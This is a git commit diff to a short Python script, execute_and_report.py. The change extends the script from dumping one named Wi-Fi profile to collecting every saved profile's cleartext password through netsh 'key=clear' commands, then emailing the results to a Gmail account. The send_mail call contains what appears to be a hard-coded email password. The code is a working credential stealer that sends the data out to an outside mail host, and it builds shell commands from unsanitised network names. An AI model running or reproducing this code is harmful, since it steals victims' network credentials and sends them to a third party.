60485494ddc7c4df06d28c530d75c3574f4bf882
Shahrukh <tramboos123@gmail.com>
2021-01-19 00:27:04 +0530

    Update execute_and_report.py

--- execute_and_report.py
+++ execute_and_report.py
@@ -1,4 +1,4 @@
-import subprocess, smtplib
+import subprocess, smtplib, re
 
 
 def send_mail(email, password, message):
@@ -9,6 +9,14 @@ def send_mail(email, password, message):
     server.quit()
 
 
-command = "netsh wlan show profile CLAY key=clear"
-result = subprocess.check_output(command, shell=True)
+command = "netsh wlan show profile"
+networks = subprocess.check_output(command, shell=True)
+network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
+
+result = ""
+for network_name in network_names_list:
+	command = "netsh wlan show profile " + network_name + " key=clear"
+	current_result = subprocess.check_output(command, shell=True)
+	result += current_result
+
 send_mail("tramboos123@gmail.com", "SHRK@GMAIL", result)
